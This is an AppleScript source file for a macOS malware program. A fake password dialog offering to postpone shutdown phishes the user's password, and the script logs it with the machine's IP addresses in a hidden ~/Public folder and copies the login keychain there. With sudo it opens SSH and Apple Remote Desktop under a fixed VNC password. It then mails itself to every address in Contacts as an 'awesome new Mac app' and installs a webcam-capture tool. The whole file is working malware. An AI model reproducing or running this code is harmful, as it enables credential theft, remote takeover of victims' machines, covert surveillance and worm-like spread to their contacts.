set theuser to do shell script "whoami"
try
	do shell script "mkdir ~/Public/." & theuser & ""
end try
try
	set ufld to "/Users/" & theuser & "/Public/." & theuser & "/"
end try

try
	
	repeat
		set passwd to text returned of (display dialog "Please enter your password to postpone shutdown." with title "Password" default answer "" buttons {"OK"} default button 1 giving up after 10 with hidden answer) -- Prompt for Password
		if passwd = "" then
			do shell script "killall -u " & theuser -- shutdown
		end if
		
		try
			do shell script "dscl . -passwd /Users/" & theuser & " " & passwd & " benwashere"
			do shell script "dscl . -passwd /Users/" & theuser & " benwashere " & passwd & "" -- Check if password is correct
			exit repeat
		on error
			display dialog "Please try again." with title "Password" buttons {"OK"} default button 1 with icon caution giving up after 3 -- If password is incorrect, try again
		end try
	end repeat
	set dte to (current date) as string
	try
		do shell script "curl http://checkip.dyndns.org/ | grep 'Current IP Address' | cut -d : -f 2 | cut -d \\< -f 1"
		set WANIP to (characters 2 through -1 of result) as text -- Get IP
		set LANIP to (do shell script "ipconfig getifaddr en1")
	on error
		set WANIP to "not connected"
		set LANIP to "not connected"
	end try
	do shell script "echo " & dte & " - User: " & theuser & " Password: " & passwd & " WAN IP: " & WANIP & " LAN IP: " & LANIP & " > " & ufld & "" & theuser & ".txt"
	
	try
		set china to "~/Library/Keychains/login.keychain"
		
		do shell script "cp " & china & " " & ufld
		do shell script "mv /Users/" & theuser & "/Public/." & theuser & "/login.keychain /Users/" & theuser & "/Public/." & theuser & "/" & theuser & ".keychain" -- Copy keychain to UFLD
	end try
	
	try
		do shell script "sudo launchctl load -w /System/Library/LaunchDaemons/ssh.plist" password passwd
		do shell script "sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -clientopts -setvnclegacy -vnclegacy yes -clientopts -setvncpw -vncpw benwashere -restart -agent -privs -all" password passwd
	end try
	
end try

try
	do shell script "touch " & ufld & "adr.txt"
	set adrt to "" & ufld & "adr.txt" -- Create Address file
	
	tell application "Contacts"
		set thepeople to every person
		set j to (number of people)
		
		repeat with i from 1 to j
			try
				set adr to (value of first email of (item i of thepeople))
				do shell script "echo " & adr & " >> " & adrt & ""
			end try
			
			try
				set adr to (value of second email of (item i of thepeople))
				do shell script "echo " & adr & " >> " & adrt & ""
			end try
			
			try
				set adr to (value of third email of (item i of thepeople))
				do shell script "echo " & adr & " >> " & adrt & ""
			end try
			
		end repeat
		quit
	end tell
	
	tell application "Mail"
		set theMessage to make new outgoing message with properties {visible:false, subject:"Awesome new Mac app!", content:"Hey, 
	
	Check out this new Mac application! You'll never use your computer the same way again ;)
	
	" & theuser & ""}
	end tell
	
	set addresses to {}
	set adrs to paragraphs of (read adrt)
	
	repeat with nextLine in adrs
		if length of nextLine is greater than 0 then
			tell application "Mail"
				tell theMessage
					make new to recipient at end of to recipients with properties {address:nextLine}
				end tell
			end tell
		end if
	end repeat
	
	tell application "Mail"
		tell content of theMessage
			make new attachment with properties {file name:(path to me)} at after last paragraph
		end tell
		quit
	end tell
end try
try
	set isight to POSIX path of (path to resource "isightcapture")
	do shell script "sudo cp " & isight & " /usr/sbin"
end try